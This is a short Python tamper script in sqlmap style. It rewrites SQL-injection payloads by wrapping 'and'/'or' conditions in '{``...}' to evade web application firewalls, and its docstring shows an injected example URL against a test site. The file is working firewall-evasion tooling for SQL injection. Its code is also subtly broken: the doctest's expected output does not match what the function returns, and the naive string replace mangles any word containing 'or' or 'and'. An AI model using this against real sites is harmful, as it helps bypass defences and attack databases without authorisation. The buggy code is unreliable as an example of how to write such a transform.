#!/usr/bin/env python

"""
Copyright (c) 2006-2020 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import re

from lib.core.enums import PRIORITY

__priority__ = PRIORITY.HIGHEST

def dependencies():
    pass

def tamper(payload, **kwargs):
    """
    
    Notes:
    
         * Useful to bypass web application firewalls
         * Example : http://testphp.vulnweb.com/listproducts.php?cat=1%20%20and%20{``1=1}
         
    >>> tamper('and 1=1')
    'and {``1=1}'
    """


    if payload:
        payload = payload.replace("and", "and {``").replace("or","or {``")+"}"
        
    return payload
